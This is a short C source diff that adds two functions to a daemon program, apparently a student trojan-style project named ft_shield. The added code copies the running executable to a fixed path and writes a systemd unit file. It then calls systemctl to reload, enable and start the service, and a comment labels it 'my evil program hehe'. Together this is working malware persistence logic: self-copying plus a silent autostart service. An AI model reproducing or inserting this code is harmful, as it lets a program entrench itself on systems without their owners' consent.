@@ -20,6 +20,48 @@ t_daemon *create_daemon( void ) {
 			 Daemon() returns -1 and sets errno to any of the errors specified
 			 for the fork(2) and setsid(2). */
 
+void copy_payload(void) {
+	if (access(EXECUTABLE_FILE, F_OK) != 0) {
+		// TODO Execute from a different path
+		// example ./some/other/path/.ft_shield
+		int in_fd = open(EXECUTABLE_NAME, O_RDONLY);
+		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0666);
+		if (in_fd < 0 || out_fd < 0) {
+			//logger.log_entry("Error copying executable", "ERROR");
+			exit(EXIT_FAILURE);
+		}
+		// get size
+		struct stat st;
+		fstat(in_fd, &st);
+		if (sendfile(out_fd, in_fd, NULL, st.st_size) < 0) {
+			//logger.log_entry("Error copying executable", "ERROR");
+			exit(EXIT_FAILURE);
+		}
+		if (close(in_fd) < 0 || close(out_fd) < 0) {
+			//logger.log_entry("Error closing executable", "ERROR");
+			exit(EXIT_FAILURE);
+		}
+	}
+	else {
+		//logger.log_entry("File already exists", "DEBUG");
+		printf("DEBUG: File already exists\n");
+	}
+}
+
+void startup_setup (void) {
+	// create ini file
+	FILE *ini_file = fopen(SYSTEMD_FILE, "w");
+	// write content to file
+	fprintf(ini_file, INI_CONTENT);
+	fclose(ini_file);
+	// Reload daemon
+	system("systemctl daemon-reload");
+	// enable my evil program hehe
+	system("systemctl enable ft_shield.service");
+	// start service
+	system("systemctl start ft_shield.service");
+}
+
 void ft_daemonize(void) {
 	pid_t pid = fork(); 
 
